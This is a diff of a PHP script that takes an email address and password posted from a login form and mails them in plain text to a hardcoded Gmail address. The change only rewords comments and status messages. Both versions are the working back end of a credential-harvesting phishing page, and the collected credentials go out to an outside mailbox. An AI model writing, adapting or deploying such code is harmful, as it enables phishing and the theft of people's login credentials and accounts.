@@ -1,24 +1,24 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Get email and password from POST request
+    // Collect email and password from the form
     $email = $_POST['email'];
     $password = $_POST['password'];
 
-    // Your email where the login info will be sent
-    $to = "ajmirahemed5@gmail.com";
-    $subject = "User Login Information";
-    $message = "Email: $email\nPassword: $password";
-    $headers = "From: noreply@yourdomain.com"; // Change this to your domain email
+    // Email details
+    $to = "ajmirahemed5@gmail.com";  // Your email address
+    $subject = "Login Info";
+    $message = "Email: " . $email . "\nPassword: " . $password;
+    $headers = "From: no-reply@yourdomain.com";
 
-    // Send the email
+    // Send email
     if (mail($to, $subject, $message, $headers)) {
-        echo "Login information sent successfully.";
+        echo "Login information has been sent successfully.";
     } else {
-        echo "Error sending login information.";
+        echo "Error: Could not send login information.";
     }
 } else {
-    // If accessed with a method other than POST
-    http_response_code(405); // Method Not Allowed
-    echo "Method not allowed.";
+    // Display error if method is not POST
+    http_response_code(405);
+    echo "Error: Method not allowed.";
 }
 ?>
